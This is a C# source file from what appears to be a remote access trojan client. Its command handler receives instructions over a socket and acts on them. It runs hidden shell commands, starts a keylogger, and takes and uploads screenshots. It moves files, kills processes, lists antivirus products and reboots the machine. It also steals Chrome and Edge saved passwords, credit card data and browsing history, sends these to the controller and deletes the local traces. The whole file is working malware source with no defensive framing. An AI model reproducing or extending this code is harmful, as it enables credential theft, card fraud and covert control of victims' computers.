using Client.Conexion;
using Client.Stealers;
using Client.Util;
using System.Diagnostics;
using System.Text;


namespace Client.Commands
{
    static class HandleCommands
    {

        public static string ExecuteCommand(string command) {

            if (string.IsNullOrWhiteSpace(command))
                return "[ERROR] El comando está vacío.";

            try
            {
                var processInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using (var process = new Process { StartInfo = processInfo })
                {
                    process.Start();

                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    process.WaitForExit();

                    if (!string.IsNullOrWhiteSpace(error))
                        output += $"\n[Error]\n{error}";

                    return output;
                }
            }
            catch (Exception ex)
            {
                return $"[EXCEPCIÓN] {ex.Message}";
            }
        }

        public static async Task<string> ProcessCommandAsync(string command)
        {
            string response = "";

            if (command.StartsWith("exec"))
            {
                response = "CMDOUT:"+HandleCommands.ExecuteCommand(command.Substring(5));
            }
            else if (command == "keylogger")
            {
                Keylogger.start();
            }
            else if (command == "keylogger stop")
            {
                Keylogger.stop();
            }
            else if (command == "list_processes")
            {
                response = Functions.ListProcesses();
            }
            else if (command.StartsWith("get "))
            {
                string fileName = command.Substring(4).Trim();
                response = "";
                ClientSocket.SendFile(fileName);
            }
            else if (command == "browsers")
            {
                response = Functions.ListInstalledBrowsers();
            }
            else if (command == "reboot")
            {
                response = HandleCommands.ExecuteCommand("shutdown /r /t 1");
            }
            else if (command == "shutdown")
            {
                response = HandleCommands.ExecuteCommand("shutdown /s");
            }
            else if (command == "antivirus")
            {
                response = Functions.ListInstalledAntivirus();
            }
            else if (command == "network_info")
            {
                response = await SystemInfo.GetNetworkInfo();
            }
            else if (command == "system_info")
            {
                response = await SystemInfo.GetSystemInfo();
            }
            else if (command == "screenshot")
            {
                string timestamp = DateTime.Now.ToString("yyyyMMdd-HHmmss");
                string filename = $"infiltrator-{timestamp}-screenshot.png";
                Screenshot.CaptureScreen(filename);
                ClientSocket.SendFile(filename);
                File.Delete(filename);
                response = "";
            }
            else if (command == "disconnect")
            {
                response = "";
                ClientSocket.setConnected(false);
            }
            else if (command.StartsWith("kill "))
            {
                int pid;
                if (int.TryParse(command.Substring(5), out pid))
                {
                    response = Functions.KillProcess(pid);
                }
                else
                {
                    response = "Formato de comando 'kill' incorrecto. Uso: kill PID";
                }
            }
            else if (command.StartsWith("sendfile "))
            {
                string fileName = command.Substring(9).Trim();
                ClientSocket.ReceiveFile(fileName);
                response = $"Archivo {fileName} recibido correctamente.";
            }
            else if (command == "chrome_passwords")
            {
                ChromeStealer.getChromePasswords();
             

                if (File.Exists("chrome_passwords.csv") ) 
                {
                    ClientSocket.SendFile("chrome_passwords.csv");
                    File.Delete("chrome_passwords.csv");
                    response = "";
                }
                else
                {
                    response = "Error al intentar obtener las credenciales de Chrome";
                }

                
            }
            else if (command == "chrome_ccs")
            {
               
                ChromeStealer.getChromeCCs();

                if (File.Exists("chrome_ccs.csv"))
                {
                    ClientSocket.SendFile("chrome_ccs.csv");
                    File.Delete("chrome_ccs.csv");
                    response = "";
                }
                else
                {
                    response = "Error al intentar obtener las tarjetas de crédito de Chrome";
                }
            }
            else if (command == "chrome_history")
            {

                ChromeStealer.getChromeHistory();

                if (File.Exists("chrome_history.csv"))
                {
                    ClientSocket.SendFile("chrome_history.csv");
                    File.Delete("chrome_history.csv");
                    response = "";
                }
                else
                {
                    response = "Error al intentar obtener el historial de Chrome";
                }
            }
            else if (command == "edge_passwords")
            {
                EdgeStealer.getEdgePasswords();


                if (File.Exists("edge_passwords.csv"))
                {
                    ClientSocket.SendFile("edge_passwords.csv");
                    File.Delete("edge_passwords.csv");

                    response = "";
                }
                else
                {
                    response = "Error al intentar obtener las credenciales de Edge";
                }


            }
            else if (command == "edge_ccs")
            {

                EdgeStealer.getEdgeCcs();

                if (File.Exists("edge_ccs.csv"))
                {
                    ClientSocket.SendFile("edge_ccs.csv");
                    File.Delete("edge_ccs.csv");
                    response = "";
                }
                else
                {
                    response = "Error al intentar obtener las tarjetas de crédito de Edge";
                }
            }
            else if (command == "edge_history")
            {

                EdgeStealer.getEdgeHistory();

                if (File.Exists("edge_history.csv"))
                {
                    ClientSocket.SendFile("edge_history.csv");
                    File.Delete("edge_history.csv");
                    response = "";
                }
                else
                {
                    response = "Error al intentar obtener el historial de Edge";
                }
            }
            else
            {
                response = "Comando no reconocido.";
            }

            return response;
        }


    }
}

